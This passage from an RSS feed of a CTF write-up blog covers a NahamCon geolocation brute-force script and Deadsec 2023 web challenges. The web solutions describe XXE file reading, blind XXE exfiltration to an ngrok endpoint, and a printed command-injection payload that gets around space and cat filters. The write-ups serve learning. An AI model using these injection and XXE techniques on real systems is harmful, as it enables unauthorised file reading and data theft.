    &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;off_by&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;off_by&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;off_by&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;



&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;move&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;180&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;180&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;dis&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;calculate_distance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;



&lt;span class=&#34;n&#34;&gt;move&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The code above  i used to be able to narrow down on which coordinated produces the least distance from waldo&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;
&lt;span class=&#34;nv&#34;&gt;lat&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;30&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-60 low 1099.613580066382

this was the lowest

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;from here i entered the values manually by trying  raising the value higher or lower and chacking the changes in the distance&lt;/p&gt;
&lt;p&gt;at   lat=40.60 and long -74.67 we needed to go even smaller units so i researched and found out that api use the following format to show distance&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;Latitude: ±DD.DDDDDD
Longitude: ±DDD.DDDDDD

where D is any number between 1-9

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;final position lat=40.583333 and long=-74.67&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/nahamcon2023/waldo_flag.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;waldo_flag&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Bic winter con 2023</title>
        <link>https://f0rk3b0mb.github.io/p/bic-winter-con-2023/</link>
        <pubDate>Wed, 31 May 2023 13:03:23 +0300</pubDate>
        
        <guid>https://f0rk3b0mb.github.io/p/bic-winter-con-2023/</guid>
        <description>&lt;p&gt;check it out on my github &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/f0rk3b0mb/bicWC&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>htb cyberapocalypse 2023</title>
        <link>https://f0rk3b0mb.github.io/p/htb-cyberapocalypse-2023/</link>
        <pubDate>Wed, 31 May 2023 12:59:47 +0300</pubDate>
        
        <guid>https://f0rk3b0mb.github.io/p/htb-cyberapocalypse-2023/</guid>
        <description>&lt;p&gt;check it out on my github &amp;raquo;  &lt;a class=&#34;link&#34; href=&#34;https://github.com/f0rk3b0mb/htb-cyberapocalypse-2023-writeup&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Deadsec 2023</title>
        <link>https://f0rk3b0mb.github.io/p/deadsec-2023/</link>
        <pubDate>Sun, 21 May 2023 12:44:03 +0300</pubDate>
        
        <guid>https://f0rk3b0mb.github.io/p/deadsec-2023/</guid>
        <description>&lt;h3 id=&#34;xee1&#34;&gt;xee1&lt;/h3&gt;
&lt;p&gt;category: web&lt;/p&gt;
&lt;h4 id=&#34;solution&#34;&gt;solution&lt;/h4&gt;
&lt;p&gt;From the title you can tell this is a classic xxe challenge , when you capture the login request in burp repeater you will realize that the username is echoed out , so we have to make sure the output of our xxe payload is reflected in the page through the user name field.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/xee/Screenshot%20from%202023-05-19%2017-24-25.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image1&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;I crafted a payload to read /flag.txt , we also need to pass it through a php filter , we get the flag in base64 format&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/xee/Screenshot%20from%202023-05-19%2017-24-50.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image2&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/xee/Screenshot%20from%202023-05-19%2017-24-59.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image3&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/xee/Screenshot%20from%202023-05-21%2016-28-43.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image4&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;xee2&#34;&gt;xee2&lt;/h3&gt;
&lt;p&gt;category: web&lt;/p&gt;
&lt;h4 id=&#34;solution-1&#34;&gt;solution&lt;/h4&gt;
&lt;p&gt;This challenge is a subsequent of xxe2 but required a  more complex approach, this time we have to receive the flag remotely since our user input is not being reflaected in the site , this is known as blind xxe . You can read more about it &lt;a class=&#34;link&#34; href=&#34;https://www.invicti.com/learn/out-of-band-xml-external-entity-oob-xxe/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;so after some research i created thhis payload that reads the /flag.txt and sends it to a ngrok endpoint, ps we also have to pass read the flag through a php filter&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/xee/Screenshot%20from%202023-05-19%2019-11-26.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image4&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;I get a hit and we can decode the flag from base64  as shown below&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/xee/Screenshot%20from%202023-05-19%2019-11-18.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image5&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;bing&#34;&gt;Bing&lt;/h3&gt;
&lt;p&gt;category: web&lt;/p&gt;
&lt;h4 id=&#34;solution-2&#34;&gt;solution&lt;/h4&gt;
&lt;p&gt;This was a little complicated , i saw it as more of a bash jail than a web challenge.&lt;/p&gt;
&lt;p&gt;Basically you wegiven a simple site with page that would serve the flag,  there was clearly command injection , cince you could run the i command. There was also a poor attempt at a  regex filter at the frontend so this challnge could only be solved using burp.&lt;/p&gt;
&lt;p&gt;file reading commands like cat were blocked also spaces , so you had to try any command you knew to read a file. Heres the solution:&lt;/p&gt;
&lt;p&gt;&amp;lsquo;head$IFS/fl??.txt|rev&amp;rsquo;&lt;/p&gt;
&lt;p&gt;without the rev the page will not display there may be a flag filter , so we reverse it&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/xee/Screenshot%20from%202023-05-21%2016-28-43.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image5&#34;
	
	
&gt;&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
